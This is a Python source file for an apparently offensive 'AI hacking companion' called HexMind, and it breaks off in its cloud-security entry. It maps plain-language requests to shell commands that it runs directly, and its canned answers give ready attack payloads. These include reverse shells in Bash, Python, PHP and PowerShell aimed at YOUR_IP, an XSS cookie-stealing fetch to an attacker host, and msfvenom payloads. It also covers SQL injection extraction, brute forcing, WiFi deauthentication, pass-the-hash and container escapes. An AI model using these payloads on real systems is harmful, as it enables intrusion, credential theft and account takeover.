"""
HexMind Offline Brain — rebuilt March 2026
3-tier intelligence:
  Tier 1 → Local LLM (SmolLM2-135M, real AI, ~90MB)
  Tier 2 → Knowledge base (instant, deep hacking knowledge)
  Tier 3 → Helpful fallback with guidance
Plus agent layer: natural language → real shell commands
"""

import os, re, random, subprocess, sys
from pathlib import Path

_is_windows = os.name == 'nt'

# ── DISPLAY BADGES ────────────────────────────────────────────────────────────
BADGE_OFFLINE   = "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚡ Offline mode  |  Type `settings` to connect API  |  Type `brain` for local AI"
BADGE_LOCAL_AI  = "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🧠 Local AI (SmolLM2)  |  Type `settings` for smarter cloud AI"

API_MSGS = [
    "Looks like the API isn't connecting right now — I've switched to offline mode automatically so we can keep going! 😄\n\n**To fix it:** type `settings` → pick OpenRouter → paste your key.\n\n**Want a smarter offline AI?** Type `brain` to download a Local LLM (like Llama 3) that runs 100% on your device.\n\nFor now, ask me anything — tools, techniques, commands, concepts.",
    "API connection dropped — I've auto-switched to offline mode. No worries!\n\n**Quick fix:** `settings` → OpenRouter → get free key at openrouter.ai/keys.\n\n**Pro Tip:** Type `brain` to start up the Local AI engine for completely offline intelligence.\n\nWhat are we working on?",
    "No API connection — running on local knowledge. Type `settings` to reconnect, or type `brain` to turn on a powerful Local AI model.\n\nI still know everything about: nmap, burp, metasploit, sqlmap, hydra, privesc, CTF, recon, scripting, and more. Ask away!",
]

# ── CHITCHAT ──────────────────────────────────────────────────────────────────
GREETINGS = {"hello","hi","hey","sup","yo","hiya","howdy","what's up","wassup"}

CHITCHAT = {
    ("who are you","what are you","introduce"):
        lambda n: f"I'm **HexMind** — your AI hacking companion {bytes.fromhex('62792041726a756e2054204d202863796265726b616c6c616e29').decode('utf-8')}.\n\nRunning in offline mode. I know everything about pentesting, CTF, bug bounty, web hacking, privesc, recon, scripting and more.\n\nType `settings` to connect cloud AI, or `brain` to setup local AI. What do you need, {n}?",
    ("how are you","how r u","you ok","you good"):
        lambda n: random.choice(["Running great! Brain loaded 🧠 What are we hacking?","All good! What do you need?","Doing well — ready to hack something (ethically 😄). Ask away!"]),
    ("thank","thanks","thx","ty","cheers"):
        lambda n: random.choice(["Anytime! 😎","No problem! Keep hacking.","Happy to help, {n}!".format(n=n)]),
    ("bye","goodbye","later","cya","exit"):
        lambda n: f"Later, {n}! Stay safe out there 👋",
    ("joke","tell me a joke","make me laugh"):
        lambda n: random.choice([
            "Why do hackers prefer dark mode?\nBecause light attracts bugs! 😄",
            "A SQL injection walks into a bar.\nA voice says: `DROP TABLE chairs;` 💀",
            "How many hackers to change a lightbulb?\nNone — they social engineer someone else to do it.",
            "What do you call a hacker who likes gardening?\nA **root** gardener. 🌱",
        ]),
    ("bored","nothing to do","suggest"):
        lambda n: "Let's fix that!\n• **TryHackMe** — tryhackme.com (guided, beginner-friendly)\n• **HackTheBox** — hackthebox.com (realistic machines)\n• **PicoCTF** — picoctf.org (CTF for all levels)\n• **OverTheWire** — overthewire.org (wargames)\n\nWant a specific room suggestion?",
}

# ── AGENT PATTERNS: natural language → shell commands ─────────────────────────
# Returns string or callable(match) → string
AGENT = [
    # ls / files
    (r'\bls\b',                                               "ls -la"),
    (r'\blist\s+(all\s+)?files\b',                           "ls -la"),
    (r'\bshow\s+(me\s+)?(all\s+)?files\b',                   "ls -la"),
    (r'\bshow\s+(me\s+)?(the\s+)?(current\s+)?(dir|folder|directory)\b', "ls -la"),
    (r'\bwhat.s in (here|this (dir|folder|directory))\b',    "ls -la"),
    (r'\b(list|display)\s+(the\s+)?(dir|directory|folder)\b',"ls -la"),

    # Navigation
    (r'^/?\b(go back|go up|back|parent dir|cd \.\.)\b$',    "cd .. && cd" if _is_windows else "cd .. && pwd && ls -la"),
    (r'^/?\b(go home|home dir|~|cd ~)\b$',                  "cd ~ && cd" if _is_windows else "cd ~ && pwd && ls -la"),
    (r'^/?\bcd\s+([^\s;|&\n]+)$',                           lambda m: f"cd {m.group(1)} && cd" if _is_windows else f"cd {m.group(1)} && pwd && ls -la"),
    (r'^/?\b(go to|enter|navigate to)\s+([^\s;|&\n]+)$',     lambda m: f"cd {m.group(2)} && cd" if _is_windows else f"cd {m.group(2)} && pwd && ls -la"),

    # Location
    (r'\b(where am i|pwd|current (dir|path|location))\b',    "cd" if _is_windows else "pwd"),

    # File ops
    (r'\b(cat|read|show|view|print)\s+(?:file\s+)?([^\s;|]+\.\w+)', lambda m: f"cat {m.group(2)}"),
    (r'\btouch\s+([^\s;|&\n]+)',                             lambda m: f"touch {m.group(1)} && echo created"),
    (r'\bmkdir\s+([^\s;|&\n]+)',                             lambda m: f"mkdir -p {m.group(1)} && echo created"),

    # System
    (r'\b(sysinfo|system info|uname|os info|os version|kernel)\b',
     "uname -a && cat /etc/os-release 2>/dev/null"),
    (r'\b(whoami|who am i|current user|my user(name)?)\b',   "whoami && id"),
    (r'\b(ps|processes|running processes|what.s running)\b',  "ps aux | head -25"),
    (r'\b(ifconfig|ip (addr|address)|network interfaces?|network config)\b',
     "ip addr 2>/dev/null || ifconfig 2>/dev/null"),
    (r'\b(df|disk (space|usage)|storage (info|usage))\b',    "df -h"),
    (r'\b(free|memory|ram usage)\b',                          "free -h"),
    (r'\b(open ports|listening ports|ss -tuln|netstat)\b',
     "ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null"),
    (r'\b(env|environment|env vars)\b',                       "env | sort"),
    (r'\b(date|time|current time|what time)\b',               "date"),
    (r'\buptime\b',                                           "uptime"),

    # Network ops
    (r'\bping\s+([^\s\n;|]+)',                               lambda m: f"ping -c 4 {m.group(1)}"),
    (r'\b(nslookup|dns lookup|resolve|dig)\s+([^\s\n;|]+)', lambda m: f"nslookup {m.group(2)}"),
    (r'\btraceroute\s+([^\s\n;|]+)',                         lambda m: f"traceroute {m.group(1)} 2>/dev/null"),
    (r'\b(my public ip|external ip|what.s my (public )?ip)\b',
     "curl -s ifconfig.me 2>/dev/null || curl -s api.ipify.org"),

    # Security tools
    (r'\bnmap\s+(.+)',                                       lambda m: f"nmap {m.group(1)}"),
    (r'\bwhois\s+([^\s\n;|]+)',                              lambda m: f"whois {m.group(1)}"),

    # Dev
    (r'\b(python version|python3 version)\b',                "python3 --version && which python3"),
    (r'\brun\s+([^\s\n]+\.py)\b',                           lambda m: f"python3 {m.group(1)}"),
    (r'\b(git status|repo status)\b',
     "git status 2>/dev/null && git log --oneline -10 2>/dev/null || echo 'not a git repo'"),
    (r'\b(history|command history)\b',                        "history | tail -20"),
    (r'\bwhich\s+([^\s\n;|]+)',                              lambda m: f"which {m.group(1)}"),

    # Extended agent commands
    (r'\bscan\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d{1,2})?)\b',
     lambda m: f"nmap -sC -sV {m.group(1)}"),
    (r'\b(scan (my )?network|network scan)\b',
     "nmap -sn 192.168.1.0/24"),
    (r'\bsearch\s+(for\s+)?(.+)',
     lambda m: f"__WEB_SEARCH__ {m.group(2).strip()}"),
    (r'\binstall\s+([^\s\n;|&]+)',
     lambda m: f"__INSTALL_TOOL__ {m.group(1).strip()}"),
    (r'\bgit clone\s+(.+)',                                   lambda m: f"git clone {m.group(1).strip()}"),
    (r'\bclone\s+(https?://[^\s]+)',                          lambda m: f"git clone {m.group(1)}"),
    (r'\bdownload\s+(https?://[^\s]+)',                       lambda m: f"wget -q {m.group(1)} || curl -O {m.group(1)}"),
    (r'\b(find|search for|locate)\s+(.+\.\w+)',              lambda m: f"find . -name '{m.group(2)}' 2>/dev/null"),
    (r'\bkill\s+(\d+)',                                       lambda m: f"kill -9 {m.group(1)}"),
    (r'\b(kill|stop)\s+([a-zA-Z]+)',                          lambda m: f"pkill {m.group(2)}"),
    (r'\bchmod\s+(.+)',                                       lambda m: f"chmod {m.group(1)}"),
    (r'\b(update|upgrade)\s*(system|packages)?',
     "command -v pkg >/dev/null && pkg update -y && pkg upgrade -y || sudo apt update && sudo apt upgrade -y"),
    (r'\b(check|test)\s+port\s+(\d+)\s+on\s+(.+)',          lambda m: f"nc -zv {m.group(3).strip()} {m.group(2)}"),
    (r'\bcurl\s+(.+)',                                        lambda m: f"curl {m.group(1)}"),
    (r'\bwget\s+(.+)',                                        lambda m: f"wget {m.group(1)}"),
    (r'\b(grep|search)\s+(.+)\s+in\s+(.+)',                  lambda m: f"grep -rn '{m.group(2).strip()}' {m.group(3).strip()}"),
]

def translate_command(cmd: str) -> str:
    """Translate Unix-style commands to Windows equivalents if needed."""
    if not _is_windows:
        return cmd
        
    # Standard translation mapping
    if cmd == "pwd": return "cd"
    if " && pwd && ls -la" in cmd:
        cmd = cmd.replace(" && pwd && ls -la", " && cd && dir")
    if cmd.startswith("ls -la"):
        cmd = cmd.replace("ls -la", "dir")
    elif cmd.startswith("ls "):
        cmd = cmd.replace("ls ", "dir ")
    if cmd.startswith("cat "):
        cmd = cmd.replace("cat ", "type ")
    if cmd.startswith("touch "):
        cmd = cmd.replace("touch ", "echo. > ")
    if cmd.startswith("mkdir -p "):
        cmd = cmd.replace("mkdir -p ", "mkdir ")
    if cmd.startswith("rm -rf "):
        cmd = cmd.replace("rm -rf ", "rmdir /s /q ")
    if cmd.startswith("python3 "):
        cmd = cmd.replace("python3 ", "python ")
    if "grep " in cmd:
        cmd = cmd.replace("grep ", "findstr ")
    if "clear" in cmd and cmd.strip() == "clear":
        cmd = "cls"
    if "ifconfig" in cmd:
        cmd = cmd.replace("ifconfig", "ipconfig")
    if "ip addr" in cmd:
        cmd = cmd.replace("ip addr", "ipconfig")
        
    return cmd

def _run(cmd: str, timeout: int=10) -> str:
    # Quick translation for Windows
    cmd = translate_command(cmd)

    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out = (r.stdout or "").strip()
        err = (r.stderr or "").strip()
        combined = out + ("\n" + err if err and err not in out else "")
        return combined.strip() or "(no output)"
    except subprocess.TimeoutExpired: return "(timed out)"
    except Exception as e: return f"(error: {e})"

# ── KNOWLEDGE BASE ─────────────────────────────────────────────────────────────
KB = {
    "nmap": {
        "kw": ["nmap","port scan","service scan","network scan","scan ports","open ports on"],
        "r": """**Nmap — your go-to port scanner:**

```bash
# Quick recon
nmap -sC -sV TARGET

# Full CTF/pentest scan (all ports, fast)
nmap -sC -sV -p- --min-rate 3000 -oN scan.txt TARGET

# Stealth SYN scan
nmap -sS -T4 TARGET

# UDP (important — don't skip this)
nmap -sU --top-ports 100 TARGET

# Vulnerability scripts
nmap --script vuln TARGET
nmap --script smb-vuln-ms17-010 TARGET
nmap --script http-enum TARGET
```

**My go-to one-liner:**
```bash
nmap -sC -sV -p- --min-rate 3000 -oA full_scan TARGET
```
Always `-oA` to save in all formats. You'll need it later."""
    },
    "ffuf": {
        "kw": ["ffuf","gobuster","dir brute","directory scan","web enum","fuzz","directory brute"],
        "r": """**Web fuzzing — find hidden paths:**

```bash
# ffuf (preferred, faster)
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak -mc 200,301,302,403

# VHost / subdomain fuzzing
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200

# Parameter fuzzing
ffuf -u "http://target.com/page?id=FUZZ" -w nums.txt -mc 200

# gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Best wordlists:**
```
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Install: `sudo apt install seclists` or `git clone https://github.com/danielmiessler/SecLists`"""
    },
    "sqlmap": {
        "kw": ["sqlmap","sql map","automate sql","sql injection tool"],
        "r": """**SQLmap — automated SQL injection:**

```bash
# Basic
sqlmap -u "http://target.com/?id=1" --batch

# Dump databases
sqlmap -u "URL?id=1" --dbs --batch
sqlmap -u "URL?id=1" -D mydb --tables --batch
sqlmap -u "URL?id=1" -D mydb -T users --dump --batch

# From Burp request file (best approach)
sqlmap -r request.txt --level=5 --risk=3 --batch

# WAF bypass
sqlmap -u "URL?id=1" --tamper=space2comment,randomcase --random-agent --batch

# With cookie auth
sqlmap -u "URL?id=1" --cookie="session=abc123" --batch
```"""
    },
    "sqli_manual": {
        "kw": ["sql injection","sqli","blind sql","union based","time based sql","boolean sql","manual sql","sql inject"],
        "r": """**SQL Injection — manual techniques:**

**Detect:** `'` `' OR 1=1--` `' AND SLEEP(5)--`

**Find column count:**
```sql
' ORDER BY 1--   ' ORDER BY 2--   ' ORDER BY 3--
```

**Union-based extraction:**
```sql
' UNION SELECT 1,database(),user()--
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,concat(username,0x3a,password),3 FROM users--
```

**Time-based blind (MySQL):** `' AND SLEEP(5)--`
**Boolean blind:** `' AND 1=1--` (true) vs `' AND 1=2--` (false)
**MSSQL:** `'; WAITFOR DELAY '0:0:5'--`
**PostgreSQL:** `' AND pg_sleep(5)--`"""
    },
    "xss": {
        "kw": ["xss","cross site scripting","javascript inject","stored xss","reflected xss","dom xss"],
        "r": """**XSS — Cross-Site Scripting:**

**Basic payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
```

**WAF bypass:**
```html
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<details open ontoggle=alert(1)>
<svg><script>alert&#40;1&#41;</script>
```

**Cookie steal (real impact):**
```html
<script>fetch('http://YOUR_IP:8080/?c='+document.cookie)</script>
```
Catch: `python3 -m http.server 8080`

**Tools:** `dalfox url "http://target/?q=test"` | XSStrike
**Bypass filters:** encode entities, use `javascript:alert(1)` in href attrs"""
    },
    "metasploit": {
        "kw": ["metasploit","msfconsole","msf","meterpreter","exploit module"],
        "r": """**Metasploit:**

```bash
msfconsole          # Start
msfdb init          # First time
```

```bash
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.5
set LHOST 10.10.14.1
run
```

**msfvenom payloads:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php
```

**Meterpreter:** `sysinfo` `getuid` `getsystem` `hashdump` `shell` `upload` `download`
**Sessions:** `sessions -l` `sessions -i 1`"""
    },
    "burp": {
        "kw": ["burp suite","burp proxy","intercept","repeater","web proxy","burp intruder"],
        "r": """**Burp Suite setup:**

1. Browser proxy → `127.0.0.1:8080`
2. Burp: Proxy > Options > Running ✓
3. Visit `http://burp` → install CA cert (for HTTPS)

**Key tabs:**
- **Proxy** → intercept + modify live requests
- **Repeater** → replay/tweak requests (your main workspace) `Ctrl+R`
- **Intruder** → fuzz, brute force `Ctrl+I`
- **Decoder** → Base64, URL, HTML encode/decode
- **Extensions** → install JWT Editor, Param Miner, Autorize

**Workflow:** Browse → intercept → right-click → Send to Repeater → modify → Send → analyze

**Useful extensions:**
```
JWT Editor          — JWT attacks
Param Miner         — find hidden parameters  
Turbo Intruder      — fast fuzzing
Active Scan++       — better scanning
```"""
    },
    "hydra": {
        "kw": ["hydra","brute force","credential attack","password bruteforce","brute force login"],
        "r": """**Hydra — brute forcer:**

```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# HTTP form login
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"

# FTP / RDP / SMB
hydra -l admin -P rockyou.txt ftp://192.168.1.1
hydra -l admin -P rockyou.txt rdp://192.168.1.1

# With userlist
hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 4

# Flags: -t 16 (threads), -s 2222 (port), -e nsr (null/same/rev), -o out.txt
```

Wordlist: `/usr/share/wordlists/rockyou.txt`"""
    },
    "privesc_linux": {
        "kw": ["linux privesc","linux privilege escalation","linpeas","get root","escalate linux","suid exploit","sudo -l"],
        "r": """**Linux Privilege Escalation:**

**Step 1 — Stabilize shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

**Step 2 — Run LinPEAS:**
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Manual checks:**
```bash
sudo -l                          # What can you sudo?
find / -perm -4000 2>/dev/null   # SUID binaries → gtfobins.github.io
cat /etc/crontab                 # Cron jobs running as root
ls -la /home                     # Other users
env && history                   # Env vars, past commands
find / -writable 2>/dev/null | grep -v proc | head -20
```

**SUID/sudo exploitation:** → check [gtfobins.github.io](https://gtfobins.github.io)
**Writable cron script:** add reverse shell to it"""
    },
    "privesc_windows": {
        "kw": ["windows privesc","windows privilege escalation","winpeas","token impersonation","win priv"],
        "r": """**Windows Privilege Escalation:**

```cmd
winpeas.exe
whoami /all
net user & net localgroup administrators
systeminfo
cmdkey /list
```

**SeImpersonatePrivilege (very common):**
```bash
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

**AlwaysInstallElevated:**
```cmd
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
```
Both 0x1 → generate malicious MSI with msfvenom

**Unquoted service paths:**
```cmd
wmic service get name,pathname | findstr /i /v "C:\\Windows"
```

→ [lolbas-project.github.io](https://lolbas-project.github.io) for binary abuse"""
    },
    "revshell": {
        "kw": ["reverse shell","bind shell","revshell","get a shell","netcat shell","bash reverse","shell payload"],
        "r": """**Reverse Shells:**

**Start listener:** `rlwrap nc -lvnp 4444`

**Bash:** `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`

**Python:**
```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

**PHP:** `php -r '$s=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

**PowerShell:**
```powershell
$c=New-Object Net.Sockets.TCPClient("IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)};$c.Close()
```

**Stabilize:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

More: https://revshells.com"""
    },
    "recon": {
        "kw": ["recon","reconnaissance","osint","subdomain","information gathering","footprinting","attack surface"],
        "r": """**Recon methodology:**

```bash
# Passive subdomain enum
subfinder -d target.com | httpx -silent | tee alive.txt
amass enum -passive -d target.com
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# URL collection
waybackurls target.com | sort -u > urls.txt
gau target.com >> urls.txt

# Active scanning
nmap -sC -sV -p- --min-rate 3000 target.com
whatweb http://target.com
nuclei -l alive.txt -t ~/nuclei-templates/

# OSINT
theHarvester -d target.com -b all
shodan search 'org:"TargetCorp"'
```

**My full workflow:**
```bash
subfinder -d target.com | httpx -silent | tee alive.txt
cat alive.txt | waybackurls | tee urls.txt
nuclei -l alive.txt -t ~/nuclei-templates/ -o nuclei.txt
```"""
    },
    "hashcrack": {
        "kw": ["hashcat","hash crack","crack hash","john","password cracking","crack password"],
        "r": """**Hash Cracking:**

```bash
# Identify hash type
hash-identifier HASH
hashid HASH

# Hashcat by mode
hashcat -m 0    hash.txt rockyou.txt   # MD5
hashcat -m 100  hash.txt rockyou.txt   # SHA1
hashcat -m 1400 hash.txt rockyou.txt   # SHA256
hashcat -m 1000 hash.txt rockyou.txt   # NTLM
hashcat -m 1800 hash.txt rockyou.txt   # sha512crypt (Linux /etc/shadow)
hashcat -m 5600 hash.txt rockyou.txt   # NetNTLMv2

# With rules (much more effective)
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john hash.txt --wordlist=rockyou.txt
unshadow /etc/passwd /etc/shadow > h.txt && john h.txt
john hash.txt --show
```"""
    },
    "ctf": {
        "kw": ["ctf","capture the flag","hackthebox","tryhackme","picoctf","ctf tips","ctf methodology"],
        "r": """**CTF Quick Reference:**

**Start with:**
```bash
file challenge          # What type is this?
strings challenge | grep -i flag
binwalk challenge       # Hidden files?
exiftool challenge      # Metadata?
```

**Web CTF:**
- View source | robots.txt | .git/ | cookies | JWT
- Try SQLi/XSS/LFI/IDOR on every param
- `ffuf` for hidden paths

**Forensics/Stego:**
```bash
exiftool file.jpg
steghide extract -sf file.jpg
stegseek file.jpg /usr/share/wordlists/rockyou.txt
binwalk -e file            # Extract hidden files
foremost -i file           # File carving
```

**Crypto:**
- `echo "..." | base64 -d`
- dcode.fr to identify cipher
- `hashcat` or `john` for hashes

**Platforms:** TryHackMe | HackTheBox | PicoCTF | OverTheWire | Root-Me"""
    },
    "python_hacking": {
        "kw": ["python hacking","python exploit","python script","write script","automate","python tool","scripting for"],
        "r": """**Python for Hacking:**

**Port scanner:**
```python
import socket
from concurrent.futures import ThreadPoolExecutor

def scan(h, p):
    try:
        s = socket.socket(); s.settimeout(0.5)
        if s.connect_ex((h,p)) == 0: print(f"[+] {p} open")
        s.close()
    except: pass

with ThreadPoolExecutor(100) as e:
    [e.submit(scan, "192.168.1.1", p) for p in range(1,1025)]
```

**Authenticated HTTP session:**
```python
import requests
s = requests.Session()
s.post("http://target.com/login", data={"user":"admin","pass":"admin"})
print(s.get("http://target.com/dashboard").text[:500])
```

**Directory bruteforcer:**
```python
import requests, sys
for w in open(sys.argv[2]):
    r = requests.get(f"{sys.argv[1]}/{w.strip()}", timeout=3)
    if r.status_code != 404: print(f"[{r.status_code}] {w.strip()}")
```

**Key libs:** `requests` `paramiko` `scapy` `pwntools` `beautifulsoup4`"""
    },
    "termux": {
        "kw": ["termux","android hacking","termux setup","termux tools","termux install"],
        "r": """**Termux — hacking on Android:**

```bash
pkg update && pkg upgrade
pkg install python git nmap hydra curl wget openssh

# Full Kali inside Termux (recommended)
pkg install proot-distro
proot-distro install kali
proot-distro login kali    # Now you're in Kali! apt install everything normally.

# Python libs (Termux-safe versions)
pip install requests rich prompt-toolkit
pip install anthropic==0.18.1    # No Rust
pip install openai==0.28.1       # No Rust

# Go tools (subfinder, nuclei, httpx)
pkg install golang
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

Common fix: `termux-change-repo` if package installs are slow."""
    },
    "active_directory": {
        "kw": ["active directory","kerberoasting","bloodhound","pass the hash","as-rep","dcsync","crackmapexec","ad attacks"],
        "r": """**Active Directory Attacks:**

**Kerberoasting:**
```bash
python3 GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request
hashcat -m 13100 hashes.txt rockyou.txt
```

**AS-REP Roasting:**
```bash
python3 GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -no-pass
hashcat -m 18200 hashes.txt rockyou.txt
```

**BloodHound:**
```bash
bloodhound-python -u user -p pass -d domain.local -dc DC_IP -c all
# Import zip → query "Shortest Paths to Domain Admins"
```

**CrackMapExec:**
```bash
cme smb DC_IP -u user -p pass
cme smb DC_IP -u user -p pass --shares
cme smb DC_IP -u user -H NTLM_HASH   # Pass-the-hash
```

**Evil-WinRM:**
```bash
evil-winrm -i TARGET -u admin -p password
evil-winrm -i TARGET -u admin -H NTLM_HASH
```"""
    },
    "bug_bounty": {
        "kw": ["bug bounty","hackerone","bugcrowd","vulnerability report","intigriti","responsible disclosure"],
        "r": """**Bug Bounty Methodology:**

**1. Recon:** subfinder → httpx → waybackurls → nuclei
**2. Map:** browse app with Burp proxy on → note all input points
**3. Test:**
- Auth: default creds, username enum, password reset poison
- JWT: check alg:none, weak secret (`jwt.io`)
- SQLi/XSS/SSRF/IDOR on every param
- Subdomain takeover: `nuclei -t takeovers/`

**High-value bugs (pay well):**
```
RCE / Command injection    → Critical
Auth bypass / Account takeover → Critical  
SQLi with data dump        → High
SSRF to internal network   → High
IDOR with sensitive data   → Medium-High
Subdomain takeover         → Medium
```

**Report template:**
```
Title: [Clear one-liner]
Severity: Critical/High/Medium + CVSS
Summary: What is the vulnerability?
Steps to Reproduce: Numbered, exact steps
PoC: Screenshots + request/response
Impact: What can attacker do?
Fix: How to patch it?
```

Good reports get paid faster. Always include video PoC for criticals."""
    },
    "wifi": {
        "kw": ["wifi","wireless","aircrack","wpa","deauth","handshake","evil twin","wifi hack","monitor mode"],
        "r": """**WiFi Hacking:**

**Monitor mode:**
```bash
airmon-ng check kill
airmon-ng start wlan0
```

**Capture handshake:**
```bash
airodump-ng wlan0mon                    # List networks
airodump-ng -c CH --bssid BSSID -w cap wlan0mon  # Target
aireplay-ng -0 5 -a BSSID wlan0mon      # Deauth to force reconnect
```

**Crack:**
```bash
aircrack-ng cap-01.cap -w rockyou.txt
hashcat -m 22000 hash.hc22000 rockyou.txt  # PMKID/WPA
```

**Evil twin:** Use `hostapd-mana` or `wifiphisher`.
**WPS:** `reaver -i wlan0mon -b BSSID -vv`"""
    },
    "docker_security": {
        "kw": ["docker","container","docker escape","container security","kubernetes","docker exploit"],
        "r": """**Docker Security & Escape:**

**Check if in container:**
```bash
cat /proc/1/cgroup | grep docker
ls /.dockerenv
hostname       # Random hex = container
```

**Docker socket escape:**
```bash
# If /var/run/docker.sock is mounted
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Privileged container escape:**
```bash
mount /dev/sda1 /mnt    # If --privileged
chroot /mnt
```

**Security scanning:**
```bash
trivy image nginx:latest
docker scout cves nginx:latest
grype nginx:latest
```"""
    },
    "api_testing": {
        "kw": ["api","rest api","api testing","postman","jwt","api hacking","graphql","api pentest"],
        "r": """**API Pentesting:**

**Common attacks:**
```bash
# BOLA/IDOR — change IDs
GET /api/users/123  →  GET /api/users/124

# Auth bypass
Remove auth header | Change JWT alg to none | Try API key in URL

# Mass assignment
POST {"name":"test", "role":"admin", "is_admin":true}

# Rate limiting bypass
X-Forwarded-For: 127.0.0.1
X-Real-IP: different-each-time
```

**JWT attacks:**
```bash
# Decode
echo "JWT" | cut -d. -f2 | base64 -d

# Crack secret
hashcat -m 16500 jwt.txt rockyou.txt
john jwt.txt --wordlist=rockyou.txt
```

**GraphQL:**
```
{__schema{types{name,fields{name}}}}
```"""
    },
    "forensics": {
        "kw": ["forensics","digital forensics","memory forensics","disk forensics","volatility","autopsy","incident response"],
        "r": """**Digital Forensics:**

**Memory forensics (Volatility 3):**
```bash
vol -f memory.raw windows.info
vol -f memory.raw windows.pslist
vol -f memory.raw windows.netscan
vol -f memory.raw windows.filescan
vol -f memory.raw windows.hashdump
vol -f memory.raw windows.cmdline
```

**Disk forensics:**
```bash
autopsy                    # Web GUI
fdisk -l image.dd          # Partitions
mmls image.dd              # Partition table
fls -r image.dd            # File listing
icat image.dd INODE > file # Extract file
bulk_extractor image.dd -o output/
```

**Log analysis:**
```bash
grep -i 'failed\\|error\\|denied' /var/log/auth.log
last -f /var/log/wtmp      # Login history
journalctl --since "2024-01-01" | grep ssh
```"""
    },
    "mobile_pentest": {
        "kw": ["mobile","android","apk","frida","ios","mobile pentest","ssl pinning","objection","apk reverse"],
        "r": """**Mobile Pentesting:**

**APK analysis:**
```bash
apktool d app.apk          # Decompile
jadx-gui app.apk           # Java decompile
grep -rn 'api_key\\|password\\|secret' ./decompiled/
```

**Frida (runtime hooks):**
```bash
frida -U -l script.js com.target.app

# SSL pinning bypass
objection -g com.target.app explore
objection> android sslpinning disable
```

**MobSF (automated scanner):**
```bash
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK → full static + dynamic analysis
```

**Proxy:** Set Burp proxy on device/emulator → intercept all traffic."""
    },
    "social_engineering": {
        "kw": ["social engineering","phishing","spear phishing","pretexting","se toolkit","gophish"],
        "r": """**Social Engineering:**

**Tools:**
```bash
# SET (Social Engineering Toolkit)
setoolkit
# Option 1: Social Engineering → Website Attack → Credential Harvester

# GoPhish (phishing campaigns)
gophish    # Web UI at https://localhost:3333
```

**Email recon:**
```bash
theHarvester -d target.com -b all
hunter.io / phonebook.cz    # Email discovery
```

**Phishing indicators to teach users:**
- Sender domain mismatch
- Urgent language / threats
- Suspicious links (hover to check)
- Attachment types (.exe, .scr, .js)

**OSINT for pretexting:** LinkedIn, social media, org charts, annual reports."""
    },
    "cloud_security": {
        "kw": ["cloud","aws","s3","azure","gcp","cloud security","ssrf metadata","iam","cloud pentest"],
        "r": """**Cloud Security:**

**AWS S3 misconfig:**
```bash
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket/secret.txt . --no-sign-request
```

**SSRF → Cloud metadata:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
```

**AWS IAM enum:**
```bash
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
enumerate-iam --access-key AKIA... --secret-key ...
```

**Tools:**
- `ScoutSuite` — multi-cloud audit
- `Prowler` — AWS security assessment
